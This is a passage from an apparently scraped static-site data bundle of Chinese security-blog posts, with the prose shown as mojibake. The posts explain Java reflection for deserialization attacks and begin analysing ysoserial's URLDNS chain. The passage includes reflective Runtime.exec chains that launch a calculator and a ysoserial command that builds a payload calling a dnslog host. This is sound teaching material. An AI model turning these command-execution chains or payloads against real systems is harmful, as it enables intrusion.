¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/00.ååºåååç-åå°.md",key:"v-0866a376",path:"/sec/vuln/deserialization/reflaction/",headers:[{level:2,title:"è·åç±»å¯¹è±¡çä¸ç§æ¹æ³",slug:"è·åç±»å¯¹è±¡çä¸ç§æ¹æ³",normalizedTitle:"è·åç±»å¯¹è±¡çä¸ç§æ¹æ³",charIndex:743},{level:3,title:"è·åç±»çå¯¹è±¡çæ¹å¼",slug:"è·åç±»çå¯¹è±¡çæ¹å¼",normalizedTitle:"è·åç±»çå¯¹è±¡çæ¹å¼",charIndex:2486},{level:2,title:"è·åç±»ä¸­çæ¹æ³",slug:"è·åç±»ä¸­çæ¹æ³",normalizedTitle:"è·åç±»ä¸­çæ¹æ³",charIndex:3380},{level:2,title:"è·åç±»ä¸­çå±æ§",slug:"è·åç±»ä¸­çå±æ§",normalizedTitle:"è·åç±»ä¸­çå±æ§",charIndex:5102}],headersStr:"è·åç±»å¯¹è±¡çä¸ç§æ¹æ³ è·åç±»çå¯¹è±¡çæ¹å¼ è·åç±»ä¸­çæ¹æ³ è·åç±»ä¸­çå±æ§",content:'# ååºåååç - åå°\n\nè¦æ³ç¥éä»ä¹æ¯åå°ï¼é¦åéè¦æç½ä»ä¹æ¯âæ­£âãå¨æ­£å¸¸æåµä¸ï¼æä»¬åå»ºå¯¹è±¡çæ¹å¼ï¼å°±åä¸é¢è¿ä¸ªä¾å­ï¼æä»¬æ³è¦åå»ºStudentç±»çå¯¹è±¡ï¼å¹¶è°ç¨å¶ä¸­çsayHelloæ¹æ³ï¼\n\nStudent student = new Student();\nstudent.sayHello();\n\n\n1\n2\n\n\nå¦åä¸é¢ä»£ç é£æ ·ï¼å ä¸ºæä»¬äºåå·²ç»ç¥éäºæè¦è¦åå»ºåªä¸ªç±»çå¯¹è±¡ï¼å æ­¤æä½¿ç¨å³é®å­newå»åå»ºæ³è¦çå¯¹è±¡ãå¯ä»¥å°è¿ç§æ¹æ³çè§£ä¸ºâæ­£âãé£ä¹ï¼å¦ææä»¬ä¸ç¥éæä»¬è¦åå»ºåªä¸ªç±»çå¯¹è±¡å¢ï¼ä½ å¯è½æ³å°ä½¿ç¨åéæ¥ä»£æ¿ä¸é¢newåé¢çç±»åï¼ä½æ¯å¨javaä¸­ï¼è¿æ¯ä¸è¡çã\n\nString className = "Student";\nStudent student = new className();\n\n\n1\n2\n\n\nå æ­¤ï¼å¨JDKä¸­æä¾äºä¸ç§åå°çæºå¶ï¼éè¿è¿ç§æºå¶å¯ä»¥å¨æçåå»ºåºæªç¥ç±»çå¯¹è±¡ã\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nConstructor<?> constructor = clazz.getConstructor();\nStudent s = (Student) constructor.newInstance();\ns.sayHello();\n\n\n1\n2\n3\n4\n\n\nä½¿ç¨è¿ç§æ¹å¼åå»ºå¯¹è±¡å¹¶è°ç¨æ¹æ³åä½¿ç¨newçæ¹å¼åå»ºå¯¹è±¡å¨æ§è¡ç»æä¸æ²¡æä»ä¹åºå«ï¼ä¸åçæ¯æä»¬å¨æ§è¡è¿æ®µä»£ç ä¹åï¼å¯ä»¥ä¸ç¥éåå»ºçæ¯åªä¸ªç±»çå¯¹è±¡ã\n\næä»¥ï¼ä»ä¹æ¯åå°ï¼\n\nåå°ï¼å°±æ¯å¨è¿è¡ç¨åºåå¹¶ä¸ç¥éè¦åå»ºåªä¸ªç±»çå¯¹è±¡ï¼ä½æ¯å¯ä»¥å¨è¿è¡æ¶å¨æçè·åç±»çå®æ´ç»æï¼å¹¶è°ç¨å¶ä¸­çæ¹æ³ã\n\n\n# è·åç±»å¯¹è±¡çä¸ç§æ¹æ³\n\n 1. Class.forNameæ¹å¼\n    \n    Class<?> clazz = Class.forName("com.pwddd.reflaction.Student");\n    \n    \n    1\n    \n\n 2. Xxx.classæ¹å¼\n    \n    Class<Student> stuClazz = Student.class;\n    \n    \n    1\n    \n\n 3. xxx.getClassæ¹å¼\n    \n    Class<? extends Student> clazz = student.getClass();\n    \n    \n    1\n    \n\nå¯¹äºç¬¬ä¸ç§æ¹å¼ï¼forNameæ¹æ³è¿æä¸ä¸ªéè½½çæ¹æ³å¦ä¸ï¼\n\npublic static Class<?> forName(String name, boolean initialize,ClassLoader loader)\n\n\n1\n\n\nè¯¥æ¹æ³æä¸ä¸ªåæ°ï¼ç¬¬ä¸ä¸ªåæ°ä¸ºåå°çæClassç±»å¯¹è±¡çå¨ç±»åï¼ç¬¬äºä¸ªåæ°ä¸ºæ¯å¦è¿è¡åå§åï¼ç¬¬ä¸ä¸ªåæ°æ¯ç±»å è½½å¨ãå¯¹äºç¬¬äºä¸ªåæ°ï¼å¦æè®¾ç½®ä¸ºtrueï¼åä¼è¿è¡ç±»çåå§åï¼ä½æ¯å¹¶ä¸ä¼è°ç¨æé å½æ°ã\n\nå¦ææä»¬ç¥éå­å¨ä¸ä¸ªç±»çå¨ç±»åï¼å¨è¿ä¸ªç±»çåå§ååä¸­å­å¨æ¶æçä»£ç ï¼é£ä¹æä»¬å°±å¯ä»¥å©ç¨åå°å»æ§è¡è¿æ®µä»£ç ãï¼å¨æ­£å¸¸çå¼åä¸­ï¼ä¸è¬æ²¡æè¿ç§ç±»ï¼\n\npackage com.pwddd.reflaction;\n\nimport java.io.IOException;\n\npublic class MyErrorClass {\n  static {\n    try {\n      System.out.println("static");\n      Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }\n\n  {\n    try {\n      System.out.println("common block");\n      Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }\n\n  public MyErrorClass() {\n    System.out.println("consructor....");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nä½¿ç¨åå°åå»ºå¯¹è±¡ã\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.MyErrorClass",true, TestReflaction.class.getClassLoader());\n\n\n1\n\n\næä»¬ä¼åç°ï¼ç³»ç»å¼¹åºäºè®¡ç®å¨ï¼å¹¶ä¸å¨æ§å¶å°æå°äºstaticãè¿ä¹å°è¯äºåé¢çè¯´æ³ï¼å½ç¬¬äºä¸ªåæ°ä¸ºtrueæ¶ï¼ä¼è¿è¡ç±»çåå§åï¼æ§è¡éæä»£ç åä¸­çåå®¹ãèééæä»£ç åä¸­çåå®¹å¨åå»ºå¯¹è±¡çæ¶åä¼æ§è¡ãå½æä»¬ä½¿ç¨forNameçå¦ä¸ä¸ªéè½½æ¹æ³è¿è¡åå°æ¶ï¼åç°åæ ·ä¹æ§è¡äºstaticä»£ç åçåå®¹ï¼è¿æ¯å ä¸ºforNameååæ°æ¹æ³åä¸ä¸ªåæ°çforNameæ¹æ³æç»é½ä¼è°ç¨forName0æ¹æ³ï¼initializeåæ°é½ä¸ºtrueï¼å¹¶å°åå§ååæ°è®¾ç½®ä¸ºtrueã\n\nreturn forName0(className, true, ClassLoader.getClassLoader(caller), caller);\n\n\n1\n\n\n\n# è·åç±»çå¯¹è±¡çæ¹å¼\n\n 1. ä½¿ç¨ç±»å¯¹è±¡çnewInstanceæ¹æ³ã\n    \n    Class<?> clazz = Class.forName("com.pwddd.reflaction.Student");\n    Student student = (Student) clazz.newInstance();\n    \n    \n    1\n    2\n    \n\n 2. è·åæé å¨ï¼è°ç¨æé å¨è·åå¯¹è±¡ã\n    \n    Class<?> clazz = Class.forName("com.pwddd.reflaction.Student");\n    Constructor<?> constructor = clazz.getConstructor();\n    Student student = (Student) constructor.newInstance();\n    \n    \n    1\n    2\n    3\n    \n\nç¬¬ä¸ç§æ¹å¼è·åå¯¹è±¡ï¼å®éä¸æ¯è°ç¨äºç±»çæ åæé æ¹æ³ï¼å¦ææ²¡ææ åæé æ¹æ³ï¼ææ åæé æ¹æ³épublicï¼ï¼åä¼æ¥éã\n\n\n\né£ä¹å¯¹äºæäºç±»ï¼ä¾å¦ï¼Runtimeç±»ï¼ï¼æä»¬æä¹è·åå¶å¯¹è±¡å¢ï¼\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nRuntime runtime = (Runtime) clazz.newInstance();\nSystem.out.println(runtime);\n\n\n1\n2\n3\n\n\næä»¬åç°ï¼ç´æ¥ä½¿ç¨newInstanceæ¹æ³æ æ³åå»ºå¯¹è±¡ãæ¥çRuntimeæºç åç°ï¼è¯¥ç±»çæé æ¹æ³è®¾ç½®ä¸ºäºprivateã\n\n\n\nè¿å®éä¸æ¯åä¾è®¾è®¡æ¨¡å¼çå¸¸è§åæ³ï¼æè°åä¾è®¾è®¡æ¨¡å¼ï¼ç®åçè§£å°±æ¯æ æ³ä½¿ç¨newçæ¹å¼åå»ºå¯¹è±¡ï¼æä¾ä¸ä¸ªéæçæ¹æ³è·åå¯¹è±¡ï¼ä»¥ä¿è¯å¯¹è±¡çå¯ä¸æ§ãå¦Runtimeå¯¹è±¡æç¤ºï¼\n\n\n\né£ä¹æä»¬è¦ææ ·æè½è·åå°è¿ç§ç±»çå¯¹è±¡å¢ï¼æä»¬éè¦åè·åå°è¿ä¸ªç±»çæå®çæ¹æ³ï¼éå¸¸ä¸ºgetç±»åæ¹æ³ï¼è¯¥æ¹æ³çè¿åå¼æ¯è¿ä¸ªç±»çå¯¹è±¡ã\n\n\n# è·åç±»ä¸­çæ¹æ³\n\nå¨è·åå°ç±»å¯¹è±¡åï¼å¯ä»¥è°ç¨ç±»å¯¹è±¡çgetMethodæ¹æ³è·åå°æå®çæ¹æ³ï¼æèåå»ºè¯¥ç±»çå¯¹è±¡ï¼ä½¿ç¨å¯¹è±¡è°ç¨æ¹æ³ã\n\n// è·åMethodæ¹æ³å¯¹è±¡ï¼è°ç¨invokeæ§è¡æ¹æ³\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nMethod sayHello = clazz.getMethod("sayHello");\nsayHello.invoke(clazz.newInstance());\n\n// åå»ºæå®ç±»çå®ä¾ï¼è°ç¨æ¹æ³\nStudent student = (Student) clazz.newInstance();\nstudent.sayHello();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¶ä¸­ï¼å¨è°ç¨invokeæ¶ï¼ç¬¬ä¸ä¸ªåæ°ä¸ºè°ç¨æå®æ¹æ³çç±»çå¯¹è±¡ï¼å¯ååæ°ä¸ºæ¹æ³çåæ°ã\n\nå¯¹äºç±»ä¸­çépublicæ¹æ³ï¼å¯ä»¥ä½¿ç¨getDeclaredMethodè·åå°æå®çæ¹æ³ãè¿éè¦è®¾ç½®å¯è®¿é®ä¸ºtrueï¼å¦åä¼æ¥éæ æ³è®¿é®ã\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nMethod privateSayHello = clazz.getDeclaredMethod("privateSayHello", String.class);\nprivateSayHello.setAccessible(true);\nprivateSayHello.invoke(clazz.newInstance(),"zhangsan");\n\n\n1\n2\n3\n4\n\n\nå¨ä¸ä¸èä¸­ï¼æä»¬åç°å½æé å¨ä¸å­å¨æèä¸ºépublicæ¶ï¼æ æ³éè¿``newInstance`åå»ºå¯¹è±¡ï¼é£ä¹å¨ç¥éå¦ä½è·åç±»ä¸­çæ¹æ³å¹¶ä¸æ§è¡åï¼è·åå¯¹è±¡å°±æ²¡æä»ä¹é¾åº¦äºã\n\nä»¥Runtimeæ¹æ³ä¸ºä¾ï¼æä»¬å¯ä»¥è·åç§æçæé å¨ï¼ç¶ååå»ºå¯¹è±¡ã\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nConstructor<?> declaredConstructor = clazz.getDeclaredConstructor();\ndeclaredConstructor.setAccessible(true);\nRuntime runtime = (Runtime) declaredConstructor.newInstance();\nruntime.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n\n\n1\n2\n3\n4\n5\n\n\næä»¬ä¹å¯ä»¥è·åå°Runtimeç±»ä¸­çgetRuntimeæ¹æ³ï¼æ§è¡è¯¥æ¹æ³è¿åä¸ä¸ªRuntimeå®ä¾ã\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nMethod getRuntime = clazz.getMethod("getRuntime");\nRuntime runtime = (Runtime) getRuntime.invoke(clazz);\nruntime.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n\n\n1\n2\n3\n4\n\n\né£ä¹æ§è¡å½ä»¤çåå°åæ³å°±å¯ä»¥ç®åä¸ºä¸é¢çæ¹å¼äºï¼\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nclazz.getMethod("exec", String.class)\n  .invoke(clazz.getMethod("getRuntime")\n       .invoke(clazz),"/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n\n\n1\n2\n3\n4\n\n\n\n# è·åç±»ä¸­çå±æ§\n\nè·åç±»ä¸­çå±æ§åè·åæ¹æ³çæ¹å¼ç±»ä¼¼ï¼ä½¿ç¨getFieldæ¹æ³ã\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nField userName = clazz.getDeclaredField("userName");\nuserName.setAccessible(true);\nStudent student = (Student) clazz.newInstance();\nuserName.set(student,"zhangsan");\nSystem.out.println(student.getUserName());\n\n\n1\n2\n3\n4\n5\n6\n\n\nä»¥ä¸å°±æ¯javaä¸­åå°çåºç¡åå®¹äºï¼æäºä»¥ä¸çç¥è¯ä¾¿äºæä»¬çè§£Javaååºååæ¼æ´çåçã',normalizedContent:'# ååºåååç - åå°\n\nè¦æ³ç¥éä»ä¹æ¯åå°ï¼é¦åéè¦æç½ä»ä¹æ¯âæ­£âãå¨æ­£å¸¸æåµä¸ï¼æä»¬åå»ºå¯¹è±¡çæ¹å¼ï¼å°±åä¸é¢è¿ä¸ªä¾å­ï¼æä»¬æ³è¦åå»ºstudentç±»çå¯¹è±¡ï¼å¹¶è°ç¨å¶ä¸­çsayhelloæ¹æ³ï¼\n\nstudent student = new student();\nstudent.sayhello();\n\n\n1\n2\n\n\nå¦åä¸é¢ä»£ç é£æ ·ï¼å ä¸ºæä»¬äºåå·²ç»ç¥éäºæè¦è¦åå»ºåªä¸ªç±»çå¯¹è±¡ï¼å æ­¤æä½¿ç¨å³é®å­newå»åå»ºæ³è¦çå¯¹è±¡ãå¯ä»¥å°è¿ç§æ¹æ³çè§£ä¸ºâæ­£âãé£ä¹ï¼å¦ææä»¬ä¸ç¥éæä»¬è¦åå»ºåªä¸ªç±»çå¯¹è±¡å¢ï¼ä½ å¯è½æ³å°ä½¿ç¨åéæ¥ä»£æ¿ä¸é¢newåé¢çç±»åï¼ä½æ¯å¨javaä¸­ï¼è¿æ¯ä¸è¡çã\n\nstring classname = "student";\nstudent student = new classname();\n\n\n1\n2\n\n\nå æ­¤ï¼å¨jdkä¸­æä¾äºä¸ç§åå°çæºå¶ï¼éè¿è¿ç§æºå¶å¯ä»¥å¨æçåå»ºåºæªç¥ç±»çå¯¹è±¡ã\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nconstructor<?> constructor = clazz.getconstructor();\nstudent s = (student) constructor.newinstance();\ns.sayhello();\n\n\n1\n2\n3\n4\n\n\nä½¿ç¨è¿ç§æ¹å¼åå»ºå¯¹è±¡å¹¶è°ç¨æ¹æ³åä½¿ç¨newçæ¹å¼åå»ºå¯¹è±¡å¨æ§è¡ç»æä¸æ²¡æä»ä¹åºå«ï¼ä¸åçæ¯æä»¬å¨æ§è¡è¿æ®µä»£ç ä¹åï¼å¯ä»¥ä¸ç¥éåå»ºçæ¯åªä¸ªç±»çå¯¹è±¡ã\n\næä»¥ï¼ä»ä¹æ¯åå°ï¼\n\nåå°ï¼å°±æ¯å¨è¿è¡ç¨åºåå¹¶ä¸ç¥éè¦åå»ºåªä¸ªç±»çå¯¹è±¡ï¼ä½æ¯å¯ä»¥å¨è¿è¡æ¶å¨æçè·åç±»çå®æ´ç»æï¼å¹¶è°ç¨å¶ä¸­çæ¹æ³ã\n\n\n# è·åç±»å¯¹è±¡çä¸ç§æ¹æ³\n\n 1. class.fornameæ¹å¼\n    \n    class<?> clazz = class.forname("com.pwddd.reflaction.student");\n    \n    \n    1\n    \n\n 2. xxx.classæ¹å¼\n    \n    class<student> stuclazz = student.class;\n    \n    \n    1\n    \n\n 3. xxx.getclassæ¹å¼\n    \n    class<? extends student> clazz = student.getclass();\n    \n    \n    1\n    \n\nå¯¹äºç¬¬ä¸ç§æ¹å¼ï¼fornameæ¹æ³è¿æä¸ä¸ªéè½½çæ¹æ³å¦ä¸ï¼\n\npublic static class<?> forname(string name, boolean initialize,classloader loader)\n\n\n1\n\n\nè¯¥æ¹æ³æä¸ä¸ªåæ°ï¼ç¬¬ä¸ä¸ªåæ°ä¸ºåå°çæclassç±»å¯¹è±¡çå¨ç±»åï¼ç¬¬äºä¸ªåæ°ä¸ºæ¯å¦è¿è¡åå§åï¼ç¬¬ä¸ä¸ªåæ°æ¯ç±»å è½½å¨ãå¯¹äºç¬¬äºä¸ªåæ°ï¼å¦æè®¾ç½®ä¸ºtrueï¼åä¼è¿è¡ç±»çåå§åï¼ä½æ¯å¹¶ä¸ä¼è°ç¨æé å½æ°ã\n\nå¦ææä»¬ç¥éå­å¨ä¸ä¸ªç±»çå¨ç±»åï¼å¨è¿ä¸ªç±»çåå§ååä¸­å­å¨æ¶æçä»£ç ï¼é£ä¹æä»¬å°±å¯ä»¥å©ç¨åå°å»æ§è¡è¿æ®µä»£ç ãï¼å¨æ­£å¸¸çå¼åä¸­ï¼ä¸è¬æ²¡æè¿ç§ç±»ï¼\n\npackage com.pwddd.reflaction;\n\nimport java.io.ioexception;\n\npublic class myerrorclass {\n  static {\n    try {\n      system.out.println("static");\n      runtime.getruntime().exec("/system/applications/calculator.app/contents/macos/calculator");\n    } catch (ioexception e) {\n      e.printstacktrace();\n    }\n  }\n\n  {\n    try {\n      system.out.println("common block");\n      runtime.getruntime().exec("/system/applications/calculator.app/contents/macos/calculator");\n    } catch (ioexception e) {\n      e.printstacktrace();\n    }\n  }\n\n  public myerrorclass() {\n    system.out.println("consructor....");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nä½¿ç¨åå°åå»ºå¯¹è±¡ã\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.myerrorclass",true, testreflaction.class.getclassloader());\n\n\n1\n\n\næä»¬ä¼åç°ï¼ç³»ç»å¼¹åºäºè®¡ç®å¨ï¼å¹¶ä¸å¨æ§å¶å°æå°äºstaticãè¿ä¹å°è¯äºåé¢çè¯´æ³ï¼å½ç¬¬äºä¸ªåæ°ä¸ºtrueæ¶ï¼ä¼è¿è¡ç±»çåå§åï¼æ§è¡éæä»£ç åä¸­çåå®¹ãèééæä»£ç åä¸­çåå®¹å¨åå»ºå¯¹è±¡çæ¶åä¼æ§è¡ãå½æä»¬ä½¿ç¨fornameçå¦ä¸ä¸ªéè½½æ¹æ³è¿è¡åå°æ¶ï¼åç°åæ ·ä¹æ§è¡äºstaticä»£ç åçåå®¹ï¼è¿æ¯å ä¸ºfornameååæ°æ¹æ³åä¸ä¸ªåæ°çfornameæ¹æ³æç»é½ä¼è°ç¨forname0æ¹æ³ï¼initializeåæ°é½ä¸ºtrueï¼å¹¶å°åå§ååæ°è®¾ç½®ä¸ºtrueã\n\nreturn forname0(classname, true, classloader.getclassloader(caller), caller);\n\n\n1\n\n\n\n# è·åç±»çå¯¹è±¡çæ¹å¼\n\n 1. ä½¿ç¨ç±»å¯¹è±¡çnewinstanceæ¹æ³ã\n    \n    class<?> clazz = class.forname("com.pwddd.reflaction.student");\n    student student = (student) clazz.newinstance();\n    \n    \n    1\n    2\n    \n\n 2. è·åæé å¨ï¼è°ç¨æé å¨è·åå¯¹è±¡ã\n    \n    class<?> clazz = class.forname("com.pwddd.reflaction.student");\n    constructor<?> constructor = clazz.getconstructor();\n    student student = (student) constructor.newinstance();\n    \n    \n    1\n    2\n    3\n    \n\nç¬¬ä¸ç§æ¹å¼è·åå¯¹è±¡ï¼å®éä¸æ¯è°ç¨äºç±»çæ åæé æ¹æ³ï¼å¦ææ²¡ææ åæé æ¹æ³ï¼ææ åæé æ¹æ³épublicï¼ï¼åä¼æ¥éã\n\n\n\né£ä¹å¯¹äºæäºç±»ï¼ä¾å¦ï¼runtimeç±»ï¼ï¼æä»¬æä¹è·åå¶å¯¹è±¡å¢ï¼\n\nclass<?> clazz = class.forname("java.lang.runtime");\nruntime runtime = (runtime) clazz.newinstance();\nsystem.out.println(runtime);\n\n\n1\n2\n3\n\n\næä»¬åç°ï¼ç´æ¥ä½¿ç¨newinstanceæ¹æ³æ æ³åå»ºå¯¹è±¡ãæ¥çruntimeæºç åç°ï¼è¯¥ç±»çæé æ¹æ³è®¾ç½®ä¸ºäºprivateã\n\n\n\nè¿å®éä¸æ¯åä¾è®¾è®¡æ¨¡å¼çå¸¸è§åæ³ï¼æè°åä¾è®¾è®¡æ¨¡å¼ï¼ç®åçè§£å°±æ¯æ æ³ä½¿ç¨newçæ¹å¼åå»ºå¯¹è±¡ï¼æä¾ä¸ä¸ªéæçæ¹æ³è·åå¯¹è±¡ï¼ä»¥ä¿è¯å¯¹è±¡çå¯ä¸æ§ãå¦runtimeå¯¹è±¡æç¤ºï¼\n\n\n\né£ä¹æä»¬è¦ææ ·æè½è·åå°è¿ç§ç±»çå¯¹è±¡å¢ï¼æä»¬éè¦åè·åå°è¿ä¸ªç±»çæå®çæ¹æ³ï¼éå¸¸ä¸ºgetç±»åæ¹æ³ï¼è¯¥æ¹æ³çè¿åå¼æ¯è¿ä¸ªç±»çå¯¹è±¡ã\n\n\n# è·åç±»ä¸­çæ¹æ³\n\nå¨è·åå°ç±»å¯¹è±¡åï¼å¯ä»¥è°ç¨ç±»å¯¹è±¡çgetmethodæ¹æ³è·åå°æå®çæ¹æ³ï¼æèåå»ºè¯¥ç±»çå¯¹è±¡ï¼ä½¿ç¨å¯¹è±¡è°ç¨æ¹æ³ã\n\n// è·åmethodæ¹æ³å¯¹è±¡ï¼è°ç¨invokeæ§è¡æ¹æ³\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nmethod sayhello = clazz.getmethod("sayhello");\nsayhello.invoke(clazz.newinstance());\n\n// åå»ºæå®ç±»çå®ä¾ï¼è°ç¨æ¹æ³\nstudent student = (student) clazz.newinstance();\nstudent.sayhello();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¶ä¸­ï¼å¨è°ç¨invokeæ¶ï¼ç¬¬ä¸ä¸ªåæ°ä¸ºè°ç¨æå®æ¹æ³çç±»çå¯¹è±¡ï¼å¯ååæ°ä¸ºæ¹æ³çåæ°ã\n\nå¯¹äºç±»ä¸­çépublicæ¹æ³ï¼å¯ä»¥ä½¿ç¨getdeclaredmethodè·åå°æå®çæ¹æ³ãè¿éè¦è®¾ç½®å¯è®¿é®ä¸ºtrueï¼å¦åä¼æ¥éæ æ³è®¿é®ã\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nmethod privatesayhello = clazz.getdeclaredmethod("privatesayhello", string.class);\nprivatesayhello.setaccessible(true);\nprivatesayhello.invoke(clazz.newinstance(),"zhangsan");\n\n\n1\n2\n3\n4\n\n\nå¨ä¸ä¸èä¸­ï¼æä»¬åç°å½æé å¨ä¸å­å¨æèä¸ºépublicæ¶ï¼æ æ³éè¿``newinstance`åå»ºå¯¹è±¡ï¼é£ä¹å¨ç¥éå¦ä½è·åç±»ä¸­çæ¹æ³å¹¶ä¸æ§è¡åï¼è·åå¯¹è±¡å°±æ²¡æä»ä¹é¾åº¦äºã\n\nä»¥runtimeæ¹æ³ä¸ºä¾ï¼æä»¬å¯ä»¥è·åç§æçæé å¨ï¼ç¶ååå»ºå¯¹è±¡ã\n\nclass<?> clazz = class.forname("java.lang.runtime");\nconstructor<?> declaredconstructor = clazz.getdeclaredconstructor();\ndeclaredconstructor.setaccessible(true);\nruntime runtime = (runtime) declaredconstructor.newinstance();\nruntime.exec("/system/applications/calculator.app/contents/macos/calculator");\n\n\n1\n2\n3\n4\n5\n\n\næä»¬ä¹å¯ä»¥è·åå°runtimeç±»ä¸­çgetruntimeæ¹æ³ï¼æ§è¡è¯¥æ¹æ³è¿åä¸ä¸ªruntimeå®ä¾ã\n\nclass<?> clazz = class.forname("java.lang.runtime");\nmethod getruntime = clazz.getmethod("getruntime");\nruntime runtime = (runtime) getruntime.invoke(clazz);\nruntime.exec("/system/applications/calculator.app/contents/macos/calculator");\n\n\n1\n2\n3\n4\n\n\né£ä¹æ§è¡å½ä»¤çåå°åæ³å°±å¯ä»¥ç®åä¸ºä¸é¢çæ¹å¼äºï¼\n\nclass<?> clazz = class.forname("java.lang.runtime");\nclazz.getmethod("exec", string.class)\n  .invoke(clazz.getmethod("getruntime")\n       .invoke(clazz),"/system/applications/calculator.app/contents/macos/calculator");\n\n\n1\n2\n3\n4\n\n\n\n# è·åç±»ä¸­çå±æ§\n\nè·åç±»ä¸­çå±æ§åè·åæ¹æ³çæ¹å¼ç±»ä¼¼ï¼ä½¿ç¨getfieldæ¹æ³ã\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nfield username = clazz.getdeclaredfield("username");\nusername.setaccessible(true);\nstudent student = (student) clazz.newinstance();\nusername.set(student,"zhangsan");\nsystem.out.println(student.getusername());\n\n\n1\n2\n3\n4\n5\n6\n\n\nä»¥ä¸å°±æ¯javaä¸­åå°çåºç¡åå®¹äºï¼æäºä»¥ä¸çç¥è¯ä¾¿äºæä»¬çè§£javaååºååæ¼æ´çåçã',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"URLDNSé¾åæ",frontmatter:{title:"URLDNSé¾åæ",date:"2022-03-12T12:00:00.000Z",permalink:"/sec/vuln/deserialization/urldns",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"åå",categories:["æ¼æ´åç","ååºååæ¼æ´"],tags:["ååºåå","URLDNS","ysoserial"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/01.URLDNS%E5%88%86%E6%9E%90.html",relativePath:"02.å®å¨/201.æ¼æ´åç/2010.ååºååæ¼æ´/01.URLDNSåæ.md",key:"v-376db697",path:"/sec/vuln/deserialization/urldns/",headers:[{level:2,title:"å©ç¨å¤ç°",slug:"å©ç¨å¤ç°",normalizedTitle:"å©ç¨å¤ç°",charIndex:148},{level:2,title:"å©ç¨é¾åæ",slug:"å©ç¨é¾åæ",normalizedTitle:"å©ç¨é¾åæ",charIndex:674},{level:3,title:"çæåºååæä»¶",slug:"çæåºååæä»¶",normalizedTitle:"çæåºååæä»¶",charIndex:684}],headersStr:"å©ç¨å¤ç° å©ç¨é¾åæ çæåºååæä»¶",content:'# ysoserial - URLDNSé¾åæ\n\nysoserialæ¯ä¸ä¸ªéå¸¸å¥½ç¨çjavaååºååçè¾å©å·¥å·ï¼å¶ä¸­æä¾äºå¤§éäºååºååå©ç¨é¾ï¼å¯ä»¥å¸®å©æä»¬çæå¯¹åºçpayloadã\n\nysoserialä¸è½½å°åï¼https://github.com/frohoff/ysoserial\n\n\n# å©ç¨å¤ç°\n\né¦åä½¿ç¨ysoserialçæURLDNSå¯¹åºçååºååæ°æ®ã\n\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\nç¶åæ¨¡æå°çæçåºååæä»¶ååºååè¯»åã\n\npublic static void main(String[] args) throws IOException, ClassNotFoundException {\n  FileInputStream fis = new FileInputStream("urldns.ser");\n  ObjectInputStream ois = new ObjectInputStream(fis);\n  Object object = ois.readObject();\n  System.out.println(object);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\næ§è¡ä»£ç ä¹åï¼å°±ä¼åç°æä»¬çdnslogä¸ä¼æä¸æ¬¡dnsçè¯·æ±ãè¯¥è¯·æ±å°±æ¯å ä¸ºååºååäºURLDNSçæçåºååæä»¶å¯¼è´çã\n\n\n\næ¥ä¸æ¥æä»¬åæä¸ä¸è¯·æ±DNSçåå ã\n\n\n# å©ç¨é¾åæ\n\n\n# çæåºååæä»¶\n\né¦åï¼åæ¥çä¸ä¸æä»¬çæURLDNS payloadçå½ä»¤ã\n\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\nå±æå®äºä¸¤ä¸ªåæ°ï¼URLDNSæ¯å¯¹åºå©ç¨é¾çåç§°ï¼åé¢çdnslogå°åæ¯å¯¹åºçåæ°ãæä»¬çysoserialæ¯æä¹å¸®æä»¬çæåºååæä»¶çã\n\nå½ä½¿ç¨java -jarè¿è¡ysoserialæ¶ï¼å®éä¸è¿è¡çæ¯GeneratePayloadç±»çmainæ¹æ³ï¼è¯¥æ¹æ³è°ç¨äºUtils.getPayloadClasså©ç¨åå°åå»ºäºæä»¬ä¼ å¥çURLDNSå¯¹åºçç±»çå¯¹è±¡ãç¶åè°ç¨getObjectæ¹æ³è·åå°å©ç¨é¾éè¦è¢«ååºååçå¯¹è±¡ãä¹åå°å¯¹è±¡ååºååä¹åè¾åºã\n\nfinal Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);\nif (payloadClass == null) {\n  System.err.println("Invalid payload type \'" + payloadType 